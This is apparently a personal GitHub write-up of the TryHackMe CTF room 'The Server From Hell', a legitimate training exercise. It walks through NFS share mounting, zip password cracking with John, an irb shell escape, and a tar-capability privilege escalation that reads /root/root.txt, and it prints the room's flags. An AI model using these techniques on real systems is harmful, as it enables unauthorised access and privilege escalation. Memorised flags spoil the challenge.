<h1 align="center">The Server From Hell</h1>
<p align="center">July 28, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>448</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/8fa70255-6888-4a2e-90b2-ecbc9c8a2414"><br>
Click <a href="https://tryhackme.com/room/theserverfromhell">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/a25f933f-dea4-4789-8f03-2f50a76cdec7"></p>

<br>

<h2>Task 1 . Hacking the server/h2>
<p>Start at port 1337 and enumerate your way.<br>
Good luck.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. flag.txt<br>
<code>thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}</code></p>


<h3>nc</h3>

```bash
:~/TheServerFromHell# nc TargetIP  1337
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

```bash
:~/TheServerFromHell# nc TargetIP 1-100 -v
Connection to targetIP 1 port [tcp/tcpmux] succeeded!
550 12345 0000000000000000000000000000000000000000000000000000000
...
```

```bash
:~/TheServerFromHell# for port in {1..100};do nc TargetIP $port;echo "";done
550 12345 0000000000000000000000000000000000000000000000000000000
```

```bash
:~/TheServerFromHell# nc TargetIP 12345
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

<img width="581" height="105" alt="image" src="https://github.com/user-attachments/assets/adefb9c6-d743-4b48-9240-fd13a7b12924" />

```bash
:~/TheServerFromHell# nmap -sC -sV -p 111,2049 -T4 TargetIP
...PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36601/tcp   mountd
|   100005  1,2,3      36968/udp   mountd
|   100005  1,2,3      44811/tcp6  mountd
|   100005  1,2,3      57678/udp6  mountd
|   100021  1,3,4      38463/tcp6  nlockmgr
|   100021  1,3,4      40921/udp6  nlockmgr
|   100021  1,3,4      43225/tcp   nlockmgr
|   100021  1,3,4      45262/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
```

```bash
:~/TheServerFromHell# showmount -e TargetIP
Export list for TargetIP:
/home/nfs *
```

```bash
:~/TheServerFromHell# sudo mount 10.10.185.234:/home/nfs ~/TheServerFromHell/mount/nfs
```

```bash
:~/TheServerFromHell/mount/nfs# ls
backup.zip
```

<h3>Zip2John</h3>

```bash
# zip2john backup.zip > hash
ver 1.0 backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B type=8
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: 2b chk, TS_chk, cmplen=22, decmplen=10, crc=F51A7381 type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B type=8
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=2F9682FA type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```



```bash
# cat hash
backup.zip:$pkzip2$3*2*1*0*8*24*1c4c*b16d*7d8849d53ca2d690df91b5f8ff302e0eae9c13c7fbb169b6d935abdfef8c00e339f84c09*1*0*8*24*6f72*b16d*7168a30d9a64dc6df0956c675b62ff980dbd4f16fe022b1abb1c75e1943c97e47bbdc5f5*2*0*16*a*f51a7381*8e5*52*0*16*f51a*b16d*5050fa8c08f92051a2cad9941e8a8f4522a8c5dbfa32*$/pkzip2$::backup.zip:home/hades/.ssh/hint.txt, home/hades/.ssh/authorized_keys, home/hades/.ssh/id_rsa:backup.zip
```

<h3>John</h3>

```bash
# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)
```

```bash
:~/TheServerFromHell/home/hades# ls -lah
total 12K
drwx------ 3 root root 4.0K Jul 29 00:29 .
drwx------ 3 root root 4.0K Jul 29 00:29 ..
drwx------ 2 root root 4.0K Sep 15  2020 .ssh
```


```bash
~/TheServerFromHell/home/hades/.ssh# ll
total 28
drwx------ 2 root root 4096 Sep 15  2020 ./
drwx------ 3 root root 4096 Jul 29 00:29 ../
-rw-r--r-- 1 root root  736 Sep 15  2020 authorized_keys
-rw-r--r-- 1 root root   33 Sep 15  2020 flag.txt
-rw-r--r-- 1 root root   10 Sep 15  2020 hint.txt
-rw------- 1 root root 3369 Sep 15  2020 id_rsa
-rw-r--r-- 1 root root  736 Sep 15  2020 id_rsa.pub
```

```bash
:~/TheServerFromHell/home/hades/.ssh# cat flag.txt
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```

<br>

<p>1.2. user.txt<br>
<code>thm{sh3ll_3c4p3_15_v3ry_1337}</code></p>


```bash
:~/TheServerFromHell/home/hades/.ssh# cat hint.txt
2500-4500
```


```bash
:~/TheServerFromHell/home/hades/.ssh# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
...
```

```bash
:~/TheServerFromHell/home/hades/.ssh# chmod 600 id_rsa
:~/TheServerFromHell/home/hades/.ssh# ssh -i id_rsa hades@TargetIP -p 3333
...
Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> ls
Traceback (most recent call last):
        2: from /usr/bin/irb:11:in `<main>'
        1: from (irb):1
NameError (undefined local variable or method `ls' for main:Object)
irb(main):002:0> system('ls')
user.txt
=> true
irb(main):003:0> system('/bin/bash')
```

```bash
hades@hell:~$ pwd
/home/hades
hades@hell:~$ ls
user.txt
hades@hell:~$ cat user.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
```


<br>

<p>1.3. root.txt<br>
<code>thm{w0w_n1c3_3sc4l4t10n}</code></p>

```bash
hades@hell:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

<br>

<h3>GTFOBins</h3>

<p>https://gtfobins.github.io/gtfobins/tar/</p>

<img width="1321" height="158" alt="image" src="https://github.com/user-attachments/assets/5108b9ab-7671-4573-96de-92528efa0504" />

<img width="1289" height="232" alt="image" src="https://github.com/user-attachments/assets/ce6051b5-81fa-4a7f-91f7-dc7b98344534" />

<br>


```bash
hades@hell:~$ tar xf "/root/root.txt" -I '/bin/sh -c "cat 1>&2"'
thm{w0w_n1c3_3sc4l4t10n}
```


<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/44b5638e-7eca-472d-99c7-715ad67419ba"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/37a31f44-b55f-4985-82fc-dbd8138afd95"></p>


<br>

<h1 align="center">My TryHackMe Journey</h1>
<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 28, 2025     | 448      |     145ᵗʰ    |      5ᵗʰ     |     127ᵗʰ   |     7ᵗʰ    | 117,756  |    880    |    72     |

</div>


<p align="center">Global All Time:   145ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/8595c8b1-6a54-43d4-820c-9a8f01e80abb"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/352d13e2-4276-417d-8dbf-2200d029716c"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/49a46bd6-aaa6-4668-a75e-7d8b3c5c71bb"><br>
                  Global monthly:    127ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/746b3ade-0cba-4e6f-857c-3ba491074a4e"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a7a5437f-4ca5-4a6f-9198-37a1956f1270"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
